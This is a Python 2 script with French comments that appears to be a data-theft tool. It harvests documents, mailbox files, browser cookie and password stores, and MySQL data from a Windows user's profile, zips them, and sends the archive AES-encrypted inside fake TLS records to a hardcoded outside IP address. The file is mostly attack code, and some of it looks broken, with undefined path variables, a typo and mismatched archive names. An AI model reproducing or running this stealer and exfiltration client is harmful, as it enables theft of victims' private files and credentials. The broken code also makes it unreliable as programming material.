
# -*- coding: utf-8 -*-

###########################
#  IMPORT  pour polop.py  #
###########################

import argparse
import os, sys
import shutil, zipfile
import os.path
import glob
import subprocess
import getpass
###########################

##################################
#Imports for exfiltration (https)#
##################################

import ssl
import sys
import time
import socket
import hashlib
import urllib2

from Crypto import Random
from Crypto.Cipher import AES

from itertools import izip_longest
# Setting timeout so that we won't wait forever
timeout = 2
socket.setdefaulttimeout(timeout)
###################################


class info_search():

	def __init__(self):
		self.argParse()

    	def argParse(self):

        	#Creation du parser
        	parser = argparse.ArgumentParser(description='Usage script info_search.py')
        	#Ajout des options dans un groupe specifique
        	options = parser.add_argument_group('options','')
        	#Liste des options disponibles
        	options.add_argument('-a', '--all', action="store_true", dest='all', default=False, help="Dump all files list in -f option")
        	options.add_argument('-c', '--char', action="store", dest='char', type=str, default=False, help="Dump files by charactere of your choice")
        	options.add_argument('-f','--format', action="store", dest='format', type=str, choices=['doc','docx','xls','xlsx','csv','ppt','pptx','txt','pst','jpg','png','pdf','vsd','vsdx','zip','rar'], default=False, help="Dump files of your choice")
        	options.add_argument('-p', '--password', action="store_true", default=False, dest='hash', help="Dump sam file (hash password)")
        	options.add_argument('-b', '--browser', default=False, dest='browser', action="store_true", help="Dump browser cookies and passwords")
        	options.add_argument('-d', '--db', default=False, dest='database', action="store_true", help="Dump database")
	
        	#On parse les arguments
        	args = parser.parse_args()

        	self.all = args.all
        	self.char = args.char
        	self.format = args.format
        	self.hash = args.hash
        	self.browser= args.browser
        	self.database = args.database
		

    	def parse_all(self):
		
        	path_docs = os.getcwd()                                     #Chemin ou l'on met les fichiers recoltes
        	if not os.path.exists(os.getcwd()+'\\dataDump'):            #Vérification que le dossier n'existe pas
		    os.mkdir(os.getcwd()+'\\dataDump')                      #Creation du dossier de récupération
		dataDump = os.getcwd()+'\\dataDump'                         #Chemin ou sont stockés les fichiers récupérés
		username = getpass.getuser()                                #Recuperation du nom de l'utilisateur courant
		#rootDir = 'C:\\'
		rootDir = 'C:\\Users'+'\\'+''+username+'\\Documents'+'\\'   #Racine à partir de laquelle on lance la recherche d'informations

		for dirName, subdirList, fileList in os.walk(rootDir):
		    fichier = open("Directory_Tree.txt", 'a')               #Ouverture du fichier "Directory_Tree.txt" contenant l'aborescence parcouru
		    fichier.write('\n %s' % dirName)
		    fichier.write('\n %s' % subdirList)
		    fichier.write('\n %s' % fileList)
		    fichier.write('\n *********************************************************************')                
		    fichier.close()

		    for file in fileList :
			filename, extension = file.rsplit('.', 1)
			print('filename: '+filename)
			print('extension: '+extension)
			try:
			    if extension == 'txt':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'doc'or extension == 'docx':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'xls' or extension == 'xlsx' or extension == 'csv':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'ppt'or extension == 'pptx':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'pst':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'jpg':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'png':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'pdf':
				shutil.copy2(dirName+'\\'+file, dataDump)   
			    if extension == 'vsd'or extension == 'vsdx':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'zip':
				shutil.copy2(dirName+'\\'+file, dataDump)
			    if extension == 'rar':
				shutil.copy2(dirName+'\\'+file, dataDump)
			except:
			    print("[Error] Extension '"+extension+"' non prise en charge")
		print("[DONE] parse with char")

				
	def parse_with_char(self):

        	path_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		username = getpass.getuser()
		#rootDir = 'C:\\'
		rootDir = 'C:\\Users'+'\\'+''+username+'\\Documents'+'\\'

		char_choice = glob.glob(str(self.char))
		for dirName, subdirList, fileList in os.walk(rootDir):
		    fichier = open("Directory_Tree.txt", 'a')
		    fichier.write('\n %s' % dirName)
		    fichier.write('\n %s' % subdirList)
		    fichier.write('\n %s' % fileList)
		    fichier.write('\n *********************************************************************')                
		    fichier.close()

		    for file in fileList : 
			filename, extension = file.rsplit('.', 1)
			if filename == self.char:
			    #print("Copie de "+dirName+ '\\'+file+' vers '+dataDump)
			    shutil.copy2(dirName+'\\'+file, dataDump)
		print("[DONE] parse with char")


	def parse_with_format(self):
		
        	path_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		username = getpass.getuser()
		#rootDir = 'C:\\'
		rootDir = 'C:\\Users'+'\\'+''+username+'\Documents'

		for dirName, subdirList, fileList in os.walk(rootDir):
		    fichier = open("Directory_Tree.txt", 'a')
		    fichier.write('\n %s' % dirName)
		    fichier.write('\n %s' % subdirList)
		    fichier.write('\n %s' % fileList)
		    fichier.write('\n *********************************************************************')                
		    fichier.close()
		    for file in fileList : 
			filename, extension = file.rsplit('.', 1)
			if extension == self.format:
			    #print("Copie de "+dirName+ '\\'+file+' vers '+dataDump)
			    shutil.copy2(dirName+'\\'+file, dataDump)
		print("[DONE] parse with format")

	def dump_browser(self):

        	path_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		username = getpass.getuser()

		#IE
		# path_ie_cookies_a = 'C:\Users' + '\\' + username + '\AppData\Roaming\Microsoft\Windows\Cookies'
		# path_ie_cookies_b = 'C:\Users' + '\\' + username + '\AppData\Roaming\Microsoft\Windows\Cookies\Low'
		# path_ie_mdp = 'C:\Users' + '\\' + username + '\Application Data\Microsoft\Credentials'

		if bool(path_ie_cookies_a) == True:
		    ie_cookies_a = glob.glob(str(path_ie_cookies_a))
		    for names in ie_cookies_a:
			#print (names)
			shutil.copy2(str(ie_cookies_a), dataDump)
		if bool(path_ie_cookies_b) == True:
		    ie_cookies_b = glob.glob(str(path_ie_cookies_b))
		    shutil.copy2(str(ie_cookies_b), dataDump)        
		if bool(path_ie_mdp) == True:
		    ie_mdp = glob.glob(str(path_ie_mdp))
		    shutil.copy2(str(ie_mdp), dataDump) #Http Authentication Passwords

		#Firefox
		# path_fi_cookies = 'C:\Users' + '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\npt2xs4d.default\cookies\sqlite'
		# path_fi_mdp = 'C:\Users' + '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\npt2xs4d.default\key3.db'

		if bool(path_fi_cookies) == True:
		    fi_cookies = glob.glob(str(path_fi_cookies))
		    shutil.copy2(str(fi_cookies), dataDump)
		if bool(path_fi_mdp) == True:
		    fi_mdp = glob.glob(str(path_fi_mdp))
		    shutil.copy2(str(fi_mdp), dataDump)

		#Chrome
		# path_ch_cookies = 'C:\Users' + '\\' + username + '\Application Data\Google\Chrome\UserData\Default\Cache'
		# path_ch_mdp = 'C:\Users' + '\\' + username + '\Application Data\Google\Chrome\User\Data\Default\Web Data'

		if bool(path_ch_cookies) == True:
		    ch_cookies = glob.glob(str(path_ch_cookies))
		    shutil.copy2(str(ch_cookies), dataDump)
		if bool(path_ch_mdp) == True:
		    ch_mdp = glob.glob(str(path_ch_cookies))
		    shutil.copy2(str(ch_mdp), dataDump)

					
	def dump_database(self):

        	#MySQL
		path_mysql = 'C:\Program Files\MySQL\Data'
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		    dataDump = os.getcwd()+'\\dataDump'

		if bool(path_mysql) == True:
		    data_mysql = glob.glob(str(path_mysql))
		    shutil.copy2(data_mysql, dataDump)
 

	def archivage(self):

        	ath_docs = os.getcwd()
		if not os.path.exists(os.getcwd()+'\\dataDump'):
		    os.mkdir(os.getcwd()+'\\dataDump')
		dataDump = os.getcwd()+'\\dataDump'
		shutil.move(path_docs+'\\'+'Directory_Tree.txt', dataDump)
		shutil.make_archive('zipDump', 'zip', dataDump)
		if os.path.exists(os.getcwd()+'\\dataDump'):
		    shutil.rmtree(os.getcwd()+'\\dataDump')
		print("[DONE] archivage")

			
	def main_infosearch(self):

        	myinstance = info_search().parse_all()
		
		    try:
			myinstance.archivage()
		    except:
			print("[Error] zip error")

	#myinstanceglobal = info_search()
	#myinstanceglobal.main()
	
#
##Exfiltration
###
def chunkstring(s, n):
	return [ s[i:i+n] for i in xrange(0, len(s), n) ]

class AESCipher(object):

	def __init__(self, key):
		self.bs = 32
        	self.key = hashlib.sha256(key.encode()).digest()

    	def encrypt(self, raw):
        	raw = self._pad(raw)
        	iv = Random.new().read(AES.block_size)
        	cipher = AES.new(self.key, AES.MODE_CBC, iv)
        	return iv + cipher.encrypt(raw)

    	def decrypt(self, enc):
        	# enc = base64.b64decode(enc)
        	iv = enc[:AES.block_size]
        	cipher = AES.new(self.key, AES.MODE_CBC, iv)
        	return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    	def _pad(self, s):
        	return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    	@staticmethod
    	def _unpad(s):
        	return s[:-ord(s[len(s)-1:])]


class HTTPSExfiltrationClient():

	def __init__(self, host, key, port=443, max_size=8192):
        	self.host = host
        	self.port = port
        	self.max_size = max_size
        	self.AESDriver = AESCipher(key=key)

        	self.sock = None

        	# Initiate the socket
        	check = self._pretendSSL()
        	if check is not 0:
            		sys.exit(1)
        	check = self._createRealSocket()
        	if check is not 0:
            		sys.exit(1)


	def _pretendSSL(self):
		try:
			response = urllib2.urlopen('https://%s:%s/' % (self.host, self.port))
			html = response.read()
		except urllib2.URLError, e:
			return 0
		except socket.error, e:
			sys.stderr.write("[!]\tCould not reach server to fake SSL handshake!\n")
			return 1
		except ssl.CertificateError:
			# Certificates does not match
			return 0


	def _createRealSocket(self):
		try:
			sock = socket.socket()
			sock.connect((self.host, self.port))
			self.sock = sock
			return 0
		except socket.error, e:
			sys.stderr.write("[!]\tCould not setup a connection to %s. Error:\n%s.\n" % (self.host, e))
			return 1


	def sendData(self, data):
		time.sleep(0.2)
		if self._createRealSocket() is 1:
			return 1

		dat = self.AESDriver.encrypt(data)

		try:
			packet_length = chr(len(dat))
		except ValueError:
			sys.stderr.write("[-]\tData is too long to send.\n")
			return 1

		if len(packet_length) == 1:
			packet_length = "\x00" + packet_length
		elif len(packet_length) == 2:
			pass
		else:
			sys.stderr.write("[!]\tPacket is too big.\n")
			return 1

		pckt = "\x17\x03\x03"+packet_length+dat
		self.sock.send(pckt)
		self.sock.close()
		sys.stdout.write("[.]\tSent '%s/%s'.\n" % (len(dat), len(pckt)))
		return 0

	def _roundItUp(self, my_int):

		try:
			as_char = chr(my_int)
		except ValueError:
			return 1

		if len(as_char) == 0:
			return "\x00\x00"

		elif len(as_char) == 1:
			return "\x00" + as_char

		elif len(as_char) == 2:
			return as_char

		else:
			return 1


	def sendFile(self, file_path):

		# Read the file
		try:
			f = open(file_path, 'rb')
			data = f.read()
			f.close()
			sys.stdout.write("[+]\tFile '%s' was loaded for exfiltration.\n" % file_path)
		except IOError, e:
			sys.stderr.write("[-]\tUnable to read file '%s'.\n%s.\n" % (file_path, e))
			return 1

		if len(data) < self.max_size -9:
			enc_data = self.AESDriver.encrypt(data)
			chunk_len = "\x00\x00"
			self.sock.send("\x17\x03\x03" + chunk_len + "\x00\x01" + "\x00\x01" + enc_data)
			sys.stdout.write("[+]\tSent file in one chunk.\n")
			return 0

		# Split into chunks by max size
		chunks = chunkstring(data, self.max_size-9)

		# Build Chunks in Order:
		transmit_blocks = []
		blocks_count = self._roundItUp(len(chunks))
		i = 0

		for chunk in chunks:
			i += 1
			enc_data = self.AESDriver.encrypt(chunk)
			chunk_len = self._roundItUp(len(enc_data))
			this_packet = self._roundItUp(i)

			if chunk_len == 1:
				# No data to encode
				pass

			else:
				this = "\x17\x03\x03" + chunk_len + this_packet + blocks_count + enc_data
				transmit_blocks.append(this)

		# Send the data
		i = 0
		for block in transmit_blocks:
			i += 1
			sys.stdout.write("[.]\tSending block %s/%s - len(%s).\n" % (i, len(transmit_blocks), len(block)-9))
			try:
				self.sock.send(block)
			except:
				self._createRealSocket()
				self.sock.send(block)
			time.sleep(0.2)
		return 0


	def close(self):
		self._createRealSocket()
		time.sleep(0.1)
		self.sock.send("\x17\x03\x03\x16\x05\x16")
		self.sock.close()
		return 0

print "[*] récupération des documents spécifiques"
myinstanceglobal = info_search()
myinstanceglobal.main_infosearch()
print "[*] fichier enregistré sous collecte.zip"
client = HTTPSExfiltrationClient(host='213.32.112.42', key="123")
client.sendFile("ZipDump.zip")
client.close()
